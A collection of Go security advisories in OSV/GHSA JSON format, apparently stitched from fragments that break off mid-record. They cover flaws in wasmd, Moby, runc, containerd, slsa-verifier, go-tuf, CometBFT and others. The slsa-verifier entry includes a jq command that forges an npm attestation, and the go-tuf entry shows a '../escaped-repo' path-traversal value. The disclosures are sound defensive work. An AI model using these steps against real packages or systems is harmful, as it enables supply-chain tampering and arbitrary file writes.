We'll add more detail once chains had a chance to upgrade.)\n\n## Mitigations\n\nApart from upgrading, it is recommended to **not** open the gRPC and REST APIs of _validator_ nodes to the public internet. Use isolated and resource-constrained environments for running separate public RPC nodes instead.\nThese can then easily be thrown away and replaced with new instances in case of problems.\n\n## Applying the patch\n\n### Official Wasmd patch\n\nThe patch will be shipped in a wasmd release. You will also have to update `libwasmvm` if you build statically.\nIf you already use the latest / close to latest wasmd, you can update more or less as follows:\n\n1. Check the current wasmd version: `go list -m github.com/CosmWasm/wasmd`\n2. Bump the `github.com/CosmWasm/wasmd` dependency in your go.mod to 0.53.2 (Cosmos SDK 0.50 compatible); `go mod tidy`; commit.\n3. If you use the static libraries `libwasmvm_muslc.aarch64.a`/`libwasmvm_muslc.x86_64.a`, make sure that you use the same version as your wasmvm version.\n4. Check the updated wasmd version: `go list -m github.com/CosmWasm/wasmd` and ensure you see 0.53.2.\n5. Follow your regular practices to deploy chain upgrades.\n\nTo double check if the correct library version is loaded at runtime, use this query:\n`<appd> query wasm libwasmvm-version`. It must show 2.1.4.\n\nThe patch is not consensus breaking _if you are already using wasmvm 2.1.3_.\nIf you are instead using wasmvm 2.1.2, then upgrading to 2.1.4 includes the consensus breaking changes of 2.1.3.\n\n### DIY Patch\n\nIf you are unable to upgrade to the latest version, you can backport the wasmd patch to your version. The patch is available at [Wasmd 0.53.2](https://github.com/CosmWasm/wasmd/compare/v0.53.0...v0.53.2).\nHowever, if you are on an older version of wasmd, you will also be using a different version of wasmvm. We provide the required patches for wasmvm in versions 2.1.4, 2.0.5, 1.5.6.\nTo upgrade using this method:\n\n1. Check the current wasmvm version: `go list -m github.com/CosmWasm/wasmvm` and upgrade\n   to the closest patched version.\n2. Bump the github.com/CosmWasm/wasmvm dependency in your go.mod to the closest compatible patched version (either 2.1.4, 2.0.5 or 1.5.6); go mod tidy; commit.\n3. Apply the patch linked above to your version of wasmd.\n4. If you use the static libraries `libwasmvm_muslc.aarch64.a`/`libwasmvm_muslc.x86_64.a`, make sure that you use the same version as your wasmvm version.\n5. Follow your regular practices to deploy chain upgrades.\n\nTo double check if the correct library version is loaded at runtime, use this query:\n`<appd> query wasm libwasmvm-version`. It must show 2.1.4, 2.0.5 or 1.5.6 and must be the same as the wasmvm version in your go.sum.\n\nThe patch is not consensus breaking as long as you were using the previous patch version of wasmvm before.\n\n## Acknowledgement\n\nThis issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.\n\nIf you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <https://hackerone.com/cosmos>.\n\n## Timeline\n\n- 2024-09-25: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.\n- 2024-09-30: Confio security contributors confirm the report.\n- 2024-11-21: Confio developed the patch internally.\n- 2024-12-06: Patch release is pre-announced through notification lists.\n- 2024-12-10: Patch released.\n\n[^1]: following Amulet's Severity Classification Framework ACMv1: https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md","affected":[{"package":{"name":"github.com/CosmWasm/wasmd","ecosystem":"Go","purl":"pkg:golang/github.com/CosmWasm/wasmd"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.53.2"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-vmg2-r3xv-r3xf/GHSA-vmg2-r3xv-r3xf.json"}}],"references":[{"type":"WEB","url":"https://github.com/CosmWasm/wasmd/security/advisories/GHSA-vmg2-r3xv-r3xf"},{"type":"PACKAGE","url":"https://github.com/CosmWasm/wasmd"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2024-12-10T16:55:35Z","nvd_published_at":null,"severity":"LOW"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.420303Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-86h5-xcpx-cfqc","published":"2024-02-27T21:55:52Z","modified":"2024-11-04T17:14:28Z","aliases":["GO-2024-2584"],"summary":"ASA-2024-005: Potential slashing evasion during re-delegation","details":"## ASA-2024-005: Potential slashing evasion during re-delegation\n\n**Component**: Cosmos SDK\n**Criticality**: Low\n**Affected Versions**: Cosmos SDK versions <= 0.50.4; <= 0.47.9\n**Affected Users**: Chain developers, Validator and Node operators\n**Impact**: Slashing Evasion\n\n## Summary\n\nAn issue was identified in the slashing mechanism that may allow for the evasion of slashing penalties during a slashing event.

Moby allows for building container images using a set of build instructions (usually named and referred to as a \"Dockerfile\"), and a build context, which is not unlike the CWD in which the Dockerfile instructions are executed.\n\nContainers may be built using a variety of tools and build backends available in the Moby ecosystem; in all cases, builds may not include files outside of the build context (such as using absolute or relative-parent paths). This is enforced through both checks in the build backends, and the containerization of the build process itself.\n\nVersions of Git where CVE-2022-39253 is present and exploited by a malicious repository, when used in combination with Moby, are subject to an unexpected inclusion of arbitrary filesystem paths in the build context, without any visible warning to the user.\n\nThis issue was originally reported by Wenxiang Qian of Tencent Blade Team, and the root-cause analysis was performed by Cory Snider of Mirantis, with assistance from Bjorn Neergaard of the same. The issue was then reported to the Git project, and Taylor Blau led the process resolving the root issue in Git.\n\n### Impact\n\nThis vulnerability originates in Git, but can be used to violate assumptions that may have security implications for users of Moby and related components. Users may rely on the fact that a build context ensures that outside files cannot be referenced or incorporated using multiple enforcement mechanisms, or expect a warning if this does not hold true. A maliciously crafted Git repository exploiting CVE-2022-39253 can violate this assumption, and potentially include sensitive files that are subsequently uploaded to a container image repository, or disclosed by code inside the resulting container image.\n\nAs this issue cannot be triggered remotely, except by users who already have full control over the daemon through the API, and it requires exploiting a vulnerability in Git by convincing a user to build a maliciously crafted repository, the impact in Moby is considered low.\n\n### Patches\n\nMoby 20.10.20, and Mirantis Container Runtime (formerly Docker Enterprise Edition) 20.10.14 will contain mitigations for CVE-2022-39253 when a Git clone is performed by Moby components (on either the daemon or API client side). However, as these mitigations only apply to certain scenarios (build of `git+<protocol>://...` URL contexts) and cannot protect against a malicious repository already on disk, users should update to a version of Git containing patches for CVE-2022-39253 on all their systems running both API clients and daemons.\n\nSpecifically, patches in Moby (including patches incorporated from BuildKit) protect against the following:\n\n* `docker build` with the legacy builder (e.g. `DOCKER_BUILDKIT` unset or set to 0) of a Git URL context. Note that depending on available API versions and the CLI version, the Git clone operation can take place on either the client or the daemon side. Both must be updated (or have Git updated) to fully protect this build method.\n* `docker build` with the BuildKit builder (e.g. `DOCKER_BUILDKIT=1`) of a Git URL context.\n* `docker buildx build` with `BUILDKIT_CONTEXT_KEEP_GIT_DIR=1` of a Git URL context.\n\nPatches in BuildKit incorporated into Docker Compose protect against CVE-2022-39253 during Compose-driven builds of Git URL contexts.\n\nPatches in Moby and related projects such as BuildKit, the Docker CLI, and Docker Compose **cannot** fully protect against CVE-2022-39253, as it may be triggered by a malicious repository already on disk that a unpatched Git client has interacted with (specifically, commands that check out submodules such as `git clone --recursive`, `git submodule update`, etc.  may have already triggered the Git vulnerability).\n\n### Workarounds\n\nWhile this behavior is unexpected and undesirable, and has resulted in this security advisory, users should keep in mind that building a container entails arbitrary code execution. Users should not build a repository/build context they do not trust, as containerization cannot protect against all possible attacks.\n\nWhen building with BuildKit (e.g. `docker buildx build` or `docker build` with `DOCKER_BUILDKIT=1`), this issue cannot be exploited unless `--build-arg BUILDKIT_CONTEXT_KEEP_GIT_DIR=1` was also passed, as by default BuildKit will discard the `.git` directory of a Git URL context immediately after cloning and checking out the repository.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/moby/moby/issues/new)\n* Email us at [security@docker.com](mailto:security@docker.com)","affected":[{"package":{"name":"github.com/docker/docker","ecosystem":"Go","purl":"pkg:golang/github.com/docker/docker"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"20.10.20"}]}],"database_specific":{"last_known_affected_version_range":"<= 20.10.19","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/11/GHSA-vp35-85q5-9f25/GHSA-vp35-85q5-9f25.json"}}],"references":[{"type":"WEB","url":"https://github.com/moby/moby/security/advisories/GHSA-vp35-85q5-9f25"},{"type":"WEB","url":"https://github.blog/2022-10-17-git-security-vulnerabilities-announced"},{"type":"PACKAGE","url":"https://github.com/moby/moby"},{"type":"WEB","url":"https://github.com/moby/moby/releases/tag/v20.10.20"},{"type":"WEB","url":"https://lore.kernel.org/git/xmqq4jw1uku5.fsf@gitster.g/T/#u"}],"database_specific":{"cwe_ids":["CWE-200"],"github_reviewed":true,"github_reviewed_at":"2022-11-11T00:03:31Z","nvd_published_at":null,"severity":"LOW"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.420576Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-x5c7-x7m2-rhmf","published":"2021-05-20T16:50:34Z","modified":"2024-08-21T15:42:05.145523Z","aliases":["GO-2022-0410"],"summary":"Local directory executable lookup in sops (Windows-only)","details":"### Impact\nWindows users using the sops direct editor option (`sops file.yaml`) can have a local executable named either `vi`, `vim`, or `nano` executed if running sops from `cmd.exe`\n\nThis attack is only viable if an attacker is able to place a malicious binary within the directory you are running sops from.

In `attestations.json`, take the value addressed by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode it, tamper with it, base64encode that, and replace the original value with that. Save the file as `attestations_tampered.json`.\n   Here is an example command to replace the package name with `@attacker/malicious`:\n   `jq -r \".attestations[0].bundle.dsseEnvelope.payload = \\\"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json | jq '.subject[0].name = \"pkg:npm/%40attacker/malicious\"' | base64 -w0)\\\"\" < attestations.json > attestations_tampered.json`\n5. `SLSA_VERIFIER_EXPERIMENTAL=1 slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json --builder-id \"https://github.com/actions/runner/github-hosted\" --package-name \"@trishankatdatadog/supreme-goggles\" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`\n6. The result is that `slsa-verifier` fails to detect this tampering of the publish attestation (unlike with the provenance attestation) and returns `PASSED`.\n\n### Impact\n\nAn attacker who controls what packages and attestations are shown to a user _can_ associate a package with an arbitrary name and version that do _not_ match what the user expects from the publish attestation. Furthermore, the package digest in the publish attestation need _not_ match its counterpart in the provenance attestation. However, the attacker _cannot_ associate the given package with an arbitrary source and builder that the user does not expect from the provenance attestation. Thus, the attacker could, for example, convince package managers to install authentic but older versions of packages that contain known, exploitable vulnerabilities.\n\nSeverity is considered low because 1) it does not invalidate the provenance and 2) support for npm is currently experimental.\n\n### Patches\n\nFixed by PR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705) and released in versions `>=2.4.1`.\n\n### Workarounds\n\nThere is no easy way for users to fix or remediate this vulnerability without upgrading, short of verifying npm's publish attestations themselves, _and_ cross-verifying it against GHA's provenance attestations.\n\n### References\n\n* [Original OpenSSF Slack thread](https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179)\n","affected":[{"package":{"name":"github.com/slsa-framework/slsa-verifier/v2","ecosystem":"Go","purl":"pkg:golang/github.com/slsa-framework/slsa-verifier/v2"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"2.4.1-rc.0"}]}],"database_specific":{"last_known_affected_version_range":"<= 2.4.0","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-r2xv-vpr2-42m9/GHSA-r2xv-vpr2-42m9.json"}},{"package":{"name":"github.com/slsa-framework/slsa-verifier","ecosystem":"Go","purl":"pkg:golang/github.com/slsa-framework/slsa-verifier"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"last_affected":"1.4.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-r2xv-vpr2-42m9/GHSA-r2xv-vpr2-42m9.json"}}],"references":[{"type":"WEB","url":"https://github.com/slsa-framework/slsa-verifier/security/advisories/GHSA-r2xv-vpr2-42m9"},{"type":"WEB","url":"https://github.com/slsa-framework/slsa-verifier/pull/705"},{"type":"WEB","url":"https://github.com/slsa-framework/slsa-verifier/commit/f6ae402f458b347d2c414f1d053fc1f8257888d0"},{"type":"WEB","url":"https://github.com/npm/attestation/tree/main/specs/publish/v0.1"},{"type":"PACKAGE","url":"https://github.com/slsa-framework/slsa-verifier"},{"type":"WEB","url":"https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2023-11-08T19:15:55Z","nvd_published_at":null,"severity":"LOW"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.408733Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-prqf-xr2j-xf65","published":"2021-08-23T19:41:41Z","modified":"2024-08-21T14:57:07.346958Z","aliases":["GO-2022-0405"],"summary":"Potential privilege escalation on Kubernetes >= v1.19 when the Argo Sever is run with `--auth-mode=client`","details":"### Impact\n\nThis is pro-active fix.

This means that users who created their own `config.json` objects and didn't prefix a deny-all rule (`{\"allow\": false, \"permissions\": \"rwm\"}` or equivalent) were not provided protection by the `devices` cgroup. This would allow malicious containers (with sufficient privileges) to create arbitrary device inodes (assuming they have `CAP_MKNOD`) and operate on any device inodes they may have access to (assuming they have regular Unix DAC permissions).\n\nHowever, most (if not all) programs that make use of `runc` include this deny-all rule. This was most likely added before the specification mandated a white-list of devices, and the fact that all programs wrote their own deny-all rule obscured the existence of this bug for several years. In fact, even the specification's examples include a default deny-all rule! We therefore believe that while this is a security bug (and has been fixed as such), it was almost certainly not exploitable in the wild due to the inclusion of default deny-all rules by all known users of `runc` -- hence why this advisory has low severity.\n\n### Patches\nThis issue has been fixed in [a patch that was part of a larger rework of the devices cgroup code in runc](https://github.com/opencontainers/runc/pull/2391) -- which lead to the discovery of this security bug. Users should upgrade to 1.0.0-rc91 as soon as it is released, or wait for your distribution to backport the relevant fixes.\n\n### Workarounds\nIf you are using `runc` directly, ensure that there is a deny-all entry at the beginning of `linux.resources.devices` -- such an entry would look like `{\"allow\": false, \"permissions\": \"rwm\"}` (all other fields are ignored, though `type` must be set to `\"a\"` or `null` if it is present).\n\nUsers which consume `runc` through another program should check whether their containers are operating under a white-list -- this can be done by reading `/sys/fs/cgroup/devices/devices.list` inside the container. If the file contains only the entry `a *:* rwm` (meaning the cgroup is in black-list mode, which likely means \"allow all device access\") then your containers are vulnerable to this issue.\n\nAs always, we recommend **in the strongest possible terms** that all of our users enable user namespaces on all of their workloads (or pressure their vendors to do so). User namespaces are one of the most significant defense-in-depth protections you can enable for containers, and have prevented many container-related vulnerabilities (both kernel 0days as well as bugs in container runtimes, such as this one).\n\n### References\n* https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/devices.html\n* [opencontainers/runtime-spec/config-linux.md#device-whitelist](https://github.com/opencontainers/runtime-spec/blob/v1.0.2/config-linux.md#device-whitelist)\n* https://github.com/opencontainers/runc/pull/2391\n\n### For more information\nIf you have any questions or comments about this advisory:\n* [Open an issue in this repo](https://github.com/opencontainers/runc/issues/new).\n* Email us at <security@opencontainers.org>.","affected":[{"package":{"name":"github.com/opencontainers/runc","ecosystem":"Go","purl":"pkg:golang/github.com/opencontainers/runc"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.0.0-rc91"}]}],"database_specific":{"last_known_affected_version_range":"<= 1.0.0-rc90","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-g54h-m393-cpwq/GHSA-g54h-m393-cpwq.json"}}],"references":[{"type":"WEB","url":"https://github.com/opencontainers/runc/security/advisories/GHSA-g54h-m393-cpwq"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2021-05-24T20:46:53Z","nvd_published_at":null,"severity":"LOW"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.361437Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-c66w-hq56-4q97","published":"2021-05-21T14:32:37Z","modified":"2024-08-21T14:57:06.574307Z","aliases":["GO-2022-0393"],"summary":"Network policy may be bypassed by some ICMP Echo Requests","details":"## Impact\n\nUnder certain conditions, ICMP Echo Request sent to a Cilium endpoint from an actor may bypass a network policy which _disallows_ access from the actor to the endpoint, but _allows_ from the endpoint to the actor.

On Windows, the shell is resolved using the standard `%ComSpec%` mechanism, with a fallback to a `%PATH%`-based search for `cmd.exe`.  While this is the standard practice on Windows systems, it presents somewhat risky behavior.\n\nFirstly, `%ComSpec%` could, in theory, be set maliciously.  Unfortunately, there's not much that can be done to prevent this attack surface, because `%ComSpec%` is the official mechanism for shell specification on Windows.  We can, however, validate that it points to an absolute path, which one would expect for a properly set value.\n\nSecondly, a fallback to a relative `cmd.exe` path, resolved via `%PATH%`, could be risky.  The risk is largely mitigated by changes in Go 1.19 and later, but prior to that a malicious `cmd.exe` could been resolved in the current working directory.  To mitigate this issue, Mutagen now uses the `%SystemRoot%` environment variable (also validated to be an absolute path) to resolve `cmd.exe` in the event that `%ComSpec%` is not set correctly.\n\n\n### Patches\n\nThe problem has been patched in Mutagen v0.16.6 and v0.17.1. Earlier versions of Mutagen are no longer supported and will not be patched. Versions of Mutagen after v0.18.0 will also have the patch merged.\n\n\n### Workarounds\n\nMaintain control of the environment variable settings on your system, in particular the `ComSpec` environment variable.\n\n### References\n\nMore information on `%ComSpec%` can be found [online](https://en.wikipedia.org/wiki/COMSPEC).\n\nMore information on Go's `PATH`-based lookup changes can be found [here](https://go.dev/blog/path-security), [here](https://go.dev/doc/go1.19#os-exec-path), and [here](https://github.com/golang/go/issues/43947).\n\nA [similar issue](https://github.com/python/cpython/issues/101283) that was addressed within the Python subprocess module also provides additional discussion.\n","affected":[{"package":{"name":"github.com/mutagen-io/mutagen","ecosystem":"Go","purl":"pkg:golang/github.com/mutagen-io/mutagen"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.16.6"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/05/GHSA-fwj4-72fm-c93g/GHSA-fwj4-72fm-c93g.json"}},{"package":{"name":"github.com/mutagen-io/mutagen","ecosystem":"Go","purl":"pkg:golang/github.com/mutagen-io/mutagen"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0.17.0"},{"fixed":"0.17.1"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/05/GHSA-fwj4-72fm-c93g/GHSA-fwj4-72fm-c93g.json"}}],"references":[{"type":"WEB","url":"https://github.com/mutagen-io/mutagen/security/advisories/GHSA-fwj4-72fm-c93g"},{"type":"PACKAGE","url":"https://github.com/mutagen-io/mutagen"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2023-05-05T02:18:26Z","nvd_published_at":null,"severity":"LOW"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.359603Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-5x4g-q5rc-36jp","published":"2024-02-03T00:02:58Z","modified":"2024-07-09T22:13:56.143176Z","aliases":["GO-2024-2527"],"related":["CGA-f93r-w2pc-gpmq"],"summary":"Etcd pkg Insecure ciphers are allowed by default","details":"### Vulnerability type\nCryptography\n\n### Detail\nThe TLS ciphers list supported by etcd contains insecure cipher suites.

Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.\n\n\n### Patches\n\nThis bug has been fixed in containerd 1.5.11 and 1.6.2.  Users should update to these versions as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.\n\nThis fix changes containerd behavior such that containers are started with a more typical Linux environment.  Refer to `capabilities(7)` for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.

Referring to https://github.com/golang/go/issues/41476#issuecomment-694914728, the 3DES algorithm vulnerability is very unlikely to be attacked. However, to address the concerns and to avoid being disturbed by the security scanner, Karmada has decided to limit the cipher suites to exclude the insecure 3DES algorithm and accordingly release this security advisory.\n\nThe components affected are：\n- karmada-apiserver\n- karmada-aggregated-apiserver\n- karmada-search\n- karmada-metrics-adapter\n- etcd\n\n### Patches\n_Has the problem been patched?

This does not impact `Exp` and `ExpCyclotomic` which are sound. Also note that GLV methods in G1 and G2 are sound and _not_ impacted.\n\n### Patches\nFix has been implemented in pull request https://github.com/Consensys/gnark-crypto/pull/451 and merged in commit https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d to master branch.\n\nThe fix increased the bounds of the sub-scalars by 1. In fact, since https://github.com/Consensys/gnark-crypto/pull/213, we use a fast scalar decomposition that tradeoffs divisions (needed in the Babai rounding) by right-shifts. We precompute `b=2^m*v/d (m > log2(d))` and then at runtime compute `scalar*b/2^m` (`v` is a lattice vector and `d` the lattice determinant). This increases the bounds on sub-scalars by 1 which we check at runtime before increasing the loop size (we don't target constant-timeness). `m` is chosen to be a machine word twice big than `log2(d)` so that we rarely need to increase the loop size. Hence why the issue happens only *sometimes* if we omit to increase the bounds. This bounds increase was implemented in G1 and G2 but forgot in GT.\n\n### Workarounds\nUpdating to `v0.12.1+`. Alternatively, use `Exp` or `ExpCyclotomic` instead. We are not aware of any users using `ExpGLV` anyway.\n\n### References\n- Fix PR: https://github.com/Consensys/gnark-crypto/pull/451 \n- Fast scalar decomposition PR: https://github.com/Consensys/gnark-crypto/pull/213\n- https://eprint.iacr.org/2015/565 Sec.4.2\n\n### Acknowledgement\nThe vulnerability was reported by [Antonio Sanso](https://github.com/asanso) @ [EF](https://crypto.ethereum.org/).\n","affected":[{"package":{"name":"github.com/consensys/gnark-crypto","ecosystem":"Go","purl":"pkg:golang/github.com/consensys/gnark-crypto"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"0.12.1"}]}],"database_specific":{"last_known_affected_version_range":"<= 0.12.0","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-pffg-92cg-xf5c/GHSA-pffg-92cg-xf5c.json"}}],"references":[{"type":"WEB","url":"https://github.com/Consensys/gnark-crypto/security/advisories/GHSA-pffg-92cg-xf5c"},{"type":"WEB","url":"https://github.com/Consensys/gnark-crypto/pull/213"},{"type":"WEB","url":"https://github.com/Consensys/gnark-crypto/pull/451"},{"type":"WEB","url":"https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d"},{"type":"WEB","url":"https://eprint.iacr.org/2015/565"},{"type":"PACKAGE","url":"https://github.com/Consensys/gnark-crypto"}],"database_specific":{"cwe_ids":[],"github_reviewed":true,"github_reviewed_at":"2023-10-05T20:57:20Z","nvd_published_at":null,"severity":"LOW"},"_metadata":{"fetched_at":"2026-01-27T01:17:40.396265Z","source":"go","ecosystem":"Go"}},{"schema_version":"1.7.3","id":"GHSA-3633-5h82-39pq","published":"2022-09-16T17:17:13Z","modified":"2024-05-20T21:34:17Z","aliases":["GO-2022-1004"],"summary":"Go-tuf Improperly handles multiple key IDs for the same public keys in attacker-controlled metadata","details":"### Issue\n\nIf an attacker is able to control a threshold of keys to insert the same public key more than once with different key IDs into signed, trusted metadata on a TUF repository, then go-tuf [clients](https://github.com/theupdateframework/go-tuf#client) < [0.3.2](https://github.com/theupdateframework/go-tuf/releases/tag/v0.3.2) are susceptible to an attack where attackers can cause the same signature from the same public key to be counted more than once against the threshold of signatures because they were mistakenly distinguished due to having different key IDs.\n\nFor example, suppose that in the root metadata file, there were a threshold of 2 self-signatures required from 2 different keys K<sub>A</sub> and K<sub>B</sub> belonging to Alice and Bob respectively.

It is advised that chains consider their specific needs for their use case when setting the `BlockParams.MaxBytes` consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the `timeout_propose` parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network’s topography.\n\nWhen setting a large `BlockParams.MaxBytes`, there are two main implications:\n* Increased bandwidth to propagate a block\n* Increased latency to propagate a block\n\nWhen combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.  The cost to propagate a 21MB block, the default value for `BlockParams.MaxBytes`, will be far higher than the cost of propagating a smaller 1MB block. CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.\n\n# Considerations\nCometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.\n\n\n# Next Steps for Chains and Validators\n\nTo increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (https://github.com/cometbft/cometbft/pull/1405, [v0.34.x](https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes), [v0.37.x](https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes), [v0.38.x](https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes)) for builders and maintainers of chain applications. Additionally, it is recommended that:\n\n\n* Chain ecosystems and their maintainers set a `BlockParams.MaxBytes` configuration appropriate for their use case at the application level; in some cases, fine-tuning `BlockParams` may require a network upgrade.\n* Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.\n* Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.\n\n* All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.\n* All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.\n\n\nThe CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the `BlockParams.MaxBytes` limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (https://github.com/cometbft/cometbft/pull/1408), allowing for an early identification and rejection of invalid or oversized blocks.

The default values for `EvidenceParams.MaxAgeNumBlocks` and `EvidenceParams.MaxAgeDuration` consensus parameters may not be sufficient for common use cases to provide coverage for the entire unbonding period for a chain (`Staking.UnbondingTime`). If the conditions of both of these parameters are exceeded, evidence may be prematurely expired and considered no longer valid, potentially allowing for unpunished Byzantine behavior if evidence is discovered outside of that window.\n\n## Next Steps for Chains and Validators\n\nIt is recommended that chain ecosystems and their maintainers set the consensus parameters `EvidenceParams.MaxAgeNumBlocks` and `EvidenceParams.MaxAgeDuration` to values appropriate for their use case:  \n- `EvidenceParams.MaxAgeDuration` (set in nanoseconds) should exceed the duration of the chain’s unbonding period\n- `EvidenceParams.MaxAgeNumBlocks` should exceed the number of estimated blocks that will be produced by your chain throughout the unbonding period\n\nFor more information about evidence in CometBFT, please see: https://docs.cometbft.com/v0.37/spec/consensus/evidence.\n\nFor more information about the cosmos-sdk  `x/staking` and `x/slashing` modules, and `UnbondingTime` parameter, please see: https://docs.cosmos.network/v0.50/build/modules/staking and https://docs.cosmos.network/v0.50/build/modules/slashing.\n\nCometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. \n\nAs more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their consensus parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature. \n\nA Github Security Advisory for this issue is available in the [CometBFT repository](https://github.com/cometbft/cometbft/security/advisories/GHSA-555p-m4v6-cqxv).

If an application accepts a map file from an untrusted source, an attacker can supply a `repoName` containing traversal (e.g., `../escaped-repo`) and cause go-tuf to create directories and write the root metadata file outside the intended `LocalMetadataDir` cache base, within the running process's filesystem permissions.\n\n## Affected Component\n\n| Field | Value |\n|-------|-------|\n| **File** | `metadata/multirepo/multirepo.go` |\n| **Function** | `(*MultiRepoClient) initTUFClients() error` |\n| **Callsite** | `metadataDir := filepath.Join(client.Config.LocalMetadataDir, repoName)` (around line 129 at the pinned commit) |\n\n## Impact\n\nWhen the TAP 4 map file content is attacker-controlled, this enables arbitrary file write relative to the process permissions (via metadata persistence during client initialization). This can be used to overwrite files writable by the process (for example, configuration files in writable directories) and may enable further compromise depending on the deployment environment.\n\n> **Note:** Exploitability is deployment-dependent. If the map file is always local and trusted (not attacker-controlled), this reduces to a misconfiguration risk rather than a remotely triggerable issue.\n\n## Attacker Model\n\n- Attacker can cause the application to load a TAP 4 map file whose `repositories` keys are attacker-controlled (for example: fetched from a URL, supply-chain substituted, or otherwise attacker-influenced input).\n- Local caching is enabled (`DisableLocalCache=false`) and the configured `LocalMetadataDir` is writable by the running process.\n\n**Claim Ceiling:** HIGH when the map file is attacker-controlled; if the map 